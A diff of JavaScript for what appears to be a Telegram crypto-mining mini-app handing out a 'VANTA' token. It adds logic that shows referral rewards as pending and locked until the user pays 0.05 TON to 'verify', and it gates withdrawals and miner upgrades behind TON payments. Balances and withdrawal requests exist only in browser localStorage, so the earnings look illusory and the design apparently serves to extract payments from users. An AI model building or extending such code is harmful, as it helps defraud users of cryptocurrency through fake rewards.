+    visibleLevels =
+      1000;
+
 
   renderMiners();
 
@@ -1978,34 +2423,128 @@ function updateFriendsUI(){
     );
 
 
-  let count =
+  let localCount =
     myR.length;
 
 
-  if(realRefs>count)
-    count=realRefs;
+  let count =
+    localCount;
+
+
+  if(
+    realRefs >
+    count
+  ){
+
+    count =
+      realRefs;
+
+  }
+
+
+  /*
+    Referral rewards from Bot.Business.
+
+    pendingref is the backend-side pending amount.
+    Once verification is complete, the app can show
+    that pending reward as unlocked.
+  */
+
+  let backendPending =
+    pendingReferral;
+
+
+  let releasedRef =
+    parseFloat(
+      localStorage.getItem(
+        'v_released_ref'
+      ) || '0'
+    );
 
 
   let total =
-    count*100;
+    count * 100;
 
 
-  let unclaimed =
-    total-refClaimed;
+  let localUnclaimed =
+    total -
+    refClaimed;
 
 
-  if(unclaimed<0)
-    unclaimed=0;
+  if(localUnclaimed < 0)
+    localUnclaimed = 0;
+
+
+  let available =
+    localUnclaimed;
+
+
+  /*
+    If the backend has supplied pending referral
+    rewards and the user is verified, expose them
+    to the claim UI.
+  */
+
+  if(
+    isVerified() &&
+    backendPending > 0 &&
+    backendPending > releasedRef
+  ){
+
+    let extra =
+      backendPending -
+      releasedRef;
+
+
+    available +=
+      extra;
+
+  }
+
+
+  /*
+    Before verification, display pending rewards
+    as locked.
+  */
+
+  let pendingDisplay =
+    0;
+
+
+  if(!isVerified()){
+
+    pendingDisplay =
+      Math.max(
+        backendPending,
+        localUnclaimed
+      );
+
+  }
 
 
   document.getElementById(
     'refCount'
-  ).innerText=count;
+  ).innerText =
+    count;
 
 
-  document.getElementById(
-    'refEarned'
-  ).innerText=unclaimed;
+  let earnedEl =
+    document.getElementById(
+      'refEarned'
+    );
+
+
+  if(earnedEl){
+
+    earnedEl.innerText =
+      (
+        isVerified()
+          ? available
+          : pendingDisplay
+      ) +
+      ' VANTA';
+
+  }
 
 
   let text =
@@ -2020,13 +2559,12 @@ function updateFriendsUI(){
     );
 
 
-  if(
-    !isVerified()
-  ){
+  if(!isVerified()){
 
     text.innerText =
-      unclaimed +
+      pendingDisplay +
       ' pending • Verify to claim';
+
 
     text.className =
       'text-xs text-yellow-400';
@@ -2037,6 +2575,7 @@ function updateFriendsUI(){
       btn.innerText =
         '🔐 Verify First';
 
+
       btn.className =
         'bg-yellow-500/20 text-yellow-400 border border-yellow-500 px-3 py-2 rounded-full text-xs';
 
@@ -2045,8 +2584,9 @@ function updateFriendsUI(){
   }else{
 
     text.innerText =
-      unclaimed +
+      available +
       ' available • +100 each';
+
 
     text.className =
       'text-xs text-white/50';
@@ -2055,10 +2595,15 @@ function updateFriendsUI(){
     if(btn){
 
       btn.innerText =
-        'Claim';
+        available > 0
+          ? 'Claim'
+          : 'No Reward';
+
 
       btn.className =
-        'bg-white/20 px-4 py-2 rounded-full text-xs';
+        available > 0
+          ? 'bg-white/20 px-4 py-2 rounded-full text-xs'
+          : 'bg-white/10 text-white/40 px-4 py-2 rounded-full text-xs';
 
     }
 
@@ -2073,7 +2618,8 @@ function updateFriendsUI(){
 
   if(listDiv){
 
-    listDiv.innerHTML="";
+    listDiv.innerHTML =
+      "";
 
 
     for(
@@ -2156,7 +2702,8 @@ function updateUI(){
 
 
   let vantaPerSec =
-    usdRate/0.0021;
+    usdRate /
+    0.0021;
 
 
   document.getElementById(
@@ -2212,6 +2759,7 @@ function updateUI(){
       badge.innerText =
         '● JOINED';
 
+
       badge.className =
         'bg-green-500/20 text-green-400 text-xs px-3 py-1 rounded-full border border-green-500';
 
@@ -2219,6 +2767,7 @@ function updateUI(){
 
       badge.innerText =
         '● NOT JOINED';
+
 
       badge.className =
         'bg-red-500/20 text-red-400 text-xs px-3 py-1 rounded-full border border-red-500';
@@ -2253,14 +2802,18 @@ function showPage(p){
 
     document.getElementById(
       x+'-page'
-    ).classList.add('hidden');
+    ).classList.add(
+      'hidden'
+    );
 
   });
 
 
   document.getElementById(
     p+'-page'
-  ).classList.remove('hidden');
+  ).classList.remove(
+    'hidden'
+  );
 
 
   [
@@ -2276,11 +2829,14 @@ function showPage(p){
         'nav-'+x
       );
 
+
     el.classList.remove(
       'nav-active'
     );
 
-    el.style.opacity='0.6';
+
+    el.style.opacity =
+      '0.6';
 
   });
 
@@ -2296,7 +2852,8 @@ function showPage(p){
   );
 
 
-  active.style.opacity='1';
+  active.style.opacity =
+    '1';
 
 
   if(p=='miners')
@@ -2334,8 +2891,8 @@ function showPage(p){
 function claim(){
 
   /*
-    Mining/claiming remains available without
-    verification as requested.
+    Mining and claiming remain available
+    without verification.
   */
 
   if(!isUserJoined()){
@@ -2344,7 +2901,11 @@ function claim(){
       '❌ You must JOIN channel first!'
     );
 
-    showPage('tasks');
+
+    showPage(
+      'tasks'
+    );
+
 
     return;
 
@@ -2355,7 +2916,8 @@ function claim(){
     return;
 
 
-  isClaiming=true;
+  isClaiming =
+    true;
 
 
   let btn =
@@ -2367,7 +2929,9 @@ function claim(){
   btn.innerText =
     "Loading AdsGram Ad...";
 
-  btn.disabled=true;
+
+  btn.disabled =
+    true;
 
 
   if(AdController){
@@ -2388,9 +2952,13 @@ function claim(){
           btn.innerText =
             "CLAIM x2 (Watch Ad)";
 
-          btn.disabled=false;
 
-          isClaiming=false;
+          btn.disabled =
+            false;
+
+
+          isClaiming =
+            false;
 
         }
 
@@ -2425,7 +2993,7 @@ function fallbackMonetagAd(){
   const randomLink =
     AD_LINKS[
       Math.floor(
-        Math.random()*
+        Math.random() *
         AD_LINKS.length
       )
     ];
@@ -2482,10 +3050,14 @@ function finishClaim(){
 
 
   let e =
-    (usdRate/0.0021)*10;
+    (
+      usdRate /
+      0.0021
+    ) * 10;
 
 
-  balance += e;
+  balance +=
+    e;
 
 
   localStorage.setItem(
@@ -2507,9 +3079,12 @@ function finishClaim(){
     "CLAIM x2 (Watch Ad)";
 
 
-  btn.disabled=false;
+  btn.disabled =
+    false;
 
-  isClaiming=false;
+
+  isClaiming =
+    false;
 
 
   alert(
@@ -2573,10 +3148,13 @@ function checkTasksUI(){
     btn1.innerText =
       '✅ Done';
 
+
     btn1.className =
       'bg-green-500/20 text-green-400 border border-green-500 px-4 py-2 rounded-full text-xs font-bold';
 
-    btn1.disabled=true;
+
+    btn1.disabled =
+      true;
 
   }
 
@@ -2588,10 +3166,13 @@ function checkTasksUI(){
       btn2.innerText =
         'Join Channel First';
 
+
       btn2.className =
         'bg-red-500/20 text-red-400 border border-red-500 px-3 py-2 rounded-full text-[10px]';
 
-      btn2.disabled=true;
+
+      btn2.disabled =
+        true;
 
     }else if(
       done.includes(
@@ -2650,14 +3231,18 @@ function checkTasksUI(){
           'bg-yellow-500/20 text-yellow-400 border border-yellow-500 px-3 py-2 rounded-full text-[11px] font-bold';
 
 
-        btn2.disabled=true;
+        btn2.disabled =
+          true;
 
       }else{
 
         let newDone =
           done.filter(
             function(x){
-              return x!=='react_post';
+
+              return x !==
+                'react_post';
+
             }
           );
 
@@ -2673,10 +3258,13 @@ function checkTasksUI(){
         btn2.innerText =
           'React';
 
+
         btn2.className =
           'bg-white text-black px-4 py-2 rounded-full text-xs font-bold';
 
-        btn2.disabled=false;
+
+        btn2.disabled =
+          false;
 
       }
 
@@ -2685,10 +3273,13 @@ function checkTasksUI(){
       btn2.innerText =
         'React';
 
+
       btn2.className =
         'bg-white text-black px-4 py-2 rounded-full text-xs font-bold';
 
-      btn2.disabled=false;
+
+      btn2.disabled =
+        false;
 
     }
 
@@ -2731,7 +3322,8 @@ function doTask(
 
 
   if(
-    taskId!=='join_channel' &&
+    taskId !==
+    'join_channel' &&
     !isUserJoined()
   ){
 
@@ -2739,7 +3331,11 @@ function doTask(
       '❌ You must JOIN our channel first!'
     );
 
-    showPage('tasks');
+
+    showPage(
+      'tasks'
+    );
+
 
     return;
 
@@ -2747,7 +3343,8 @@ function doTask(
 
 
   if(
-    taskId==='join_channel'
+    taskId ===
+    'join_channel'
   ){
 
     if(
@@ -2773,7 +3370,8 @@ function doTask(
 
     if(
       btn &&
-      btn.innerText==='Join'
+      btn.innerText ===
+      'Join'
     ){
 
       window.open(
@@ -2802,13 +3400,17 @@ function doTask(
       )
     ){
 
-      balance += amount;
+      balance +=
+        amount;
+
 
       done.push(
         taskId
       );
 
-      times[taskId]=now;
+
+      times[taskId] =
+        now;
 
 
       localStorage.setItem(
@@ -2819,13 +3421,17 @@ function doTask(
 
       localStorage.setItem(
         'v_tasks_done',
-        JSON.stringify(done)
+        JSON.stringify(
+          done
+        )
       );
 
 
       localStorage.setItem(
         'v_tasks_time',
-        JSON.stringify(times)
+        JSON.stringify(
+          times
+        )
       );
 
 
@@ -2846,6 +3452,7 @@ function doTask(
         ' VANTA'
       );
 
+
       return;
 
     }
@@ -2853,14 +3460,18 @@ function doTask(
   }
 
 
-  if(link)
+  if(link){
+
     window.open(
       link,
       '_blank'
     );
 
+  }
 
-  balance += amount;
+
+  balance +=
+    amount;
 
 
   if(
@@ -2876,18 +3487,23 @@ function doTask(
   }
 
 
-  times[taskId]=now;
+  times[taskId] =
+    now;
 
 
   localStorage.setItem(
     'v_tasks_done',
-    JSON.stringify(done)
+    JSON.stringify(
+      done
+    )
   );
 
 
   localStorage.setItem(
     'v_tasks_time',
-    JSON.stringify(times)
+    JSON.stringify(
+      times
+    )
   );
 
 
@@ -2917,16 +3533,40 @@ function doTask(
 
 function copyRef(){
 
-  navigator.clipboard.writeText(
+  let link =
     document.getElementById(
       'refLink'
-    ).innerText
-  );
+    ).innerText;
 
 
-  alert(
-    'Copied!'
-  );
+  if(
+    navigator.clipboard &&
+    navigator.clipboard.writeText
+  ){
+
+    navigator.clipboard.writeText(
+      link
+    ).then(function(){
+
+      alert(
+        'Copied!'
+      );
+
+    }).catch(function(){
+
+      alert(
+        link
+      );
+
+    });
+
+  }else{
+
+    alert(
+      link
+    );
+
+  }
 
 }
 
@@ -2938,9 +3578,8 @@ function copyRef(){
 function claimReferral(){
 
   /*
-    IMPORTANT:
-    Referral rewards are LOCKED until
-    the user verifies with 0.05 TON.
+    Referral rewards are locked until
+    the account is verified.
   */
 
   if(!isVerified()){
@@ -2951,7 +3590,11 @@ function claimReferral(){
       "before claiming referral rewards."
     );
 
-    showPage('mine');
+
+    showPage(
+      'mine'
+    );
+
 
     return;
 
@@ -2964,7 +3607,11 @@ function claimReferral(){
       '❌ Join channel first!'
     );
 
-    showPage('tasks');
+
+    showPage(
+      'tasks'
+    );
+
 
     return;
 
@@ -2983,8 +3630,12 @@ function claimReferral(){
     myR.length;
 
 
-  if(realRefs>count)
-    count=realRefs;
+  if(
+    realRefs >
+    count
+  )
+    count =
+      realRefs;
 
 
   let total =
@@ -2992,7 +3643,41 @@ function claimReferral(){
 
 
   let unclaimed =
-    total-refClaimed;
+    total -
+    refClaimed;
+
+
+  if(unclaimed<0)
+    unclaimed=0;
+
+
+  /*
+    Add backend pending referral amount
+    that was supplied by Bot.Business.
+  */
+
+  let backendPending =
+    pendingReferral;
+
+
+  let releasedRef =
+    parseFloat(
+      localStorage.getItem(
+        'v_released_ref'
+      ) || '0'
+    );
+
+
+  if(
+    backendPending >
+    releasedRef
+  ){
+
+    unclaimed +=
+      backendPending -
+      releasedRef;
+
+  }
 
 
   if(unclaimed<=0){
@@ -3000,8 +3685,9 @@ function claimReferral(){
     alert(
       count==0
         ? 'Invite friends first!'
-        : 'All claimed'
+        : 'All referral rewards claimed.'
     );
+
 
     return;
 
@@ -3025,6 +3711,13 @@ function claimReferral(){
 
         }
 
+      })
+      .catch(function(){
+
+        alert(
+          '❌ Ad was not completed.'
+        );
+
       });
 
   }else{
@@ -3038,6 +3731,10 @@ function claimReferral(){
 }
 
 
+/* ============================================================
+   COMPLETE REFERRAL CLAIM
+============================================================ */
+
 function completeReferralClaim(
   unclaimed
 ){
@@ -3050,6 +3747,24 @@ function completeReferralClaim(
     unclaimed;
 
 
+  /*
+    Mark backend pending rewards as released
+    locally after successful claim.
+  */
+
+  if(
+    pendingReferral >
+    0
+  ){
+
+    localStorage.setItem(
+      'v_released_ref',
+      pendingReferral.toString()
+    );
+
+  }
+
+
   localStorage.setItem(
     'v_balance',
     balance
@@ -3058,13 +3773,13 @@ function completeReferralClaim(
 
   localStorage.setItem(
     refClaimedKey,
-    refClaimed
+    refClaimed.toString()
   );
 
 
   localStorage.setItem(
     'v_ref_claimed',
-    refClaimed
+    refClaimed.toString()
   );
 
 
@@ -3081,7 +3796,7 @@ function completeReferralClaim(
 
 
 /* ============================================================
-   WITHDRAW
+   WITHDRAW UI
 ============================================================ */
 
 function updateWithdrawUI(){
@@ -3098,7 +3813,10 @@ function updateWithdrawUI(){
     );
 
 
-  if(!btn || !card)
+  if(
+    !btn ||
+    !card
+  )
     return;
 
 
@@ -3106,6 +3824,7 @@ function updateWithdrawUI(){
 
     btn.innerText =
       '🔐 VERIFY TO WITHDRAW';
+
 
     btn.className =
       'w-full bg-yellow-500/20 text-yellow-400 border border-yellow-500 mt-3 py-3 rounded-xl font-bold';
@@ -3118,6 +3837,7 @@ function updateWithdrawUI(){
 
     btn.innerText =
       'Request Withdraw';
+
 
     btn.className =
       'w-full bg-white text-black mt-3 py-3 rounded-xl font-bold';
@@ -3143,6 +3863,10 @@ let withdrawRequests =
   );
 
 
+/* ============================================================
+   CALCULATE RECEIVE
+============================================================ */
+
 function calcReceive(){
 
   let v =
@@ -3154,7 +3878,7 @@ function calcReceive(){
 
 
   let r =
-    v-30;
+    v - 30;
 
 
   if(r<0)
@@ -3186,7 +3910,11 @@ function withdraw(){
       "You must verify with 0.05 TON before withdrawing VANTA."
     );
 
-    showPage('mine');
+
+    showPage(
+      'mine'
+    );
+
 
     return;
 
@@ -3215,7 +3943,7 @@ function withdraw(){
   if(v>balance){
 
     alert(
-      'Insufficient'
+      'Insufficient balance'
     );
 
     return;
@@ -3224,9 +3952,11 @@ function withdraw(){
 
 
   let wallet =
+    connectedWalletAddress ||
     localStorage.getItem(
       'v_wallet'
-    ) || '';
+    ) ||
+    '';
 
 
   if(!wallet){
@@ -3246,7 +3976,11 @@ function withdraw(){
       '❌ Join channel first!'
     );
 
-    showPage('tasks');
+
+    showPage(
+      'tasks'
+    );
+
 
     return;
 
@@ -3267,28 +4001,36 @@ function withdraw(){
   }
 
 
-  balance -= v;
+  balance -=
+    v;
 
 
   let req = {
 
-    id:Date.now(),
+    id:
+      Date.now(),
 
-    amount:v,
+    amount:
+      v,
 
-    receive:v-30,
+    receive:
+      v-30,
 
-    wallet:wallet,
+    wallet:
+      wallet,
 
-    userId:tgId,
+    userId:
+      tgId,
 
-    userName:tgName,
+    userName:
+      tgName,
 
     date:
       new Date()
         .toLocaleString(),
 
-    status:'pending'
+    status:
+      'pending'
 
   };
 
@@ -3324,7 +4066,8 @@ function withdraw(){
 
   document.getElementById(
     'withdrawAmt'
-  ).value='';
+  ).value =
+    '';
 
 
   calcReceive();
@@ -3349,7 +4092,8 @@ function renderWithdrawHistory(){
 
 
   if(
-    withdrawRequests.length==0
+    withdrawRequests.length ==
+    0
   ){
 
     div.innerHTML =
@@ -3387,7 +4131,8 @@ function renderWithdrawHistory(){
           </div>
 
           <span class="${
-            r.status=='pending'
+            r.status ==
+            'pending'
               ? 'text-yellow-400'
               : 'text-green-400'
           }">
@@ -3416,7 +4161,7 @@ async function buyMiner(
 ){
 
   if(
-    lvl!=
+    lvl !=
     currentMinerLevel+1
   ){
 
@@ -3432,7 +4177,8 @@ async function buyMiner(
 
 
   if(
-    balance<vantaCost
+    balance <
+    vantaCost
   ){
 
     alert(
@@ -3463,6 +4209,17 @@ async function buyMiner(
   }
 
 
+  if(!connectedWalletAddress){
+
+    alert(
+      '❌ Connect your TON wallet first.'
+    );
+
+    return;
+
+  }
+
+
   try{
 
     const transaction = {
@@ -3470,9 +4227,10 @@ async function buyMiner(
       validUntil:
         Math.floor(
           Date.now()/1000
-        )+300,
+        ) + 300,
 
-      network:"-239",
+      network:
+        "-239",
 
       messages:[
 
@@ -3509,7 +4267,7 @@ async function buyMiner(
       lvl;
 
 
-    power =
+    let powerValue =
       1.0 +
       lvl*0.06;
 
@@ -3528,7 +4286,7 @@ async function buyMiner(
 
     localStorage.setItem(
       'v_power',
-      power.toString()
+      powerValue.toString()
     );
 
 
@@ -3546,10 +4304,14 @@ async function buyMiner(
 
   }catch(e){
 
-    console.log(e);
+    console.log(
+      "Miner payment error:",
+      e
+    );
+
 
     alert(
-      '❌ TON Payment cancelled'
+      '❌ TON Payment cancelled or failed.'
     );
 
   }
@@ -3571,7 +4333,8 @@ setInterval(
 
 
     let vps =
-      usdRate/0.0021;
+      usdRate /
+      0.0021;
 
 
     balance +=
@@ -3643,7 +4406,6 @@ if(savedWallet){
     savedWallet.slice(-4);
 
 }
-
 
 </script>
 
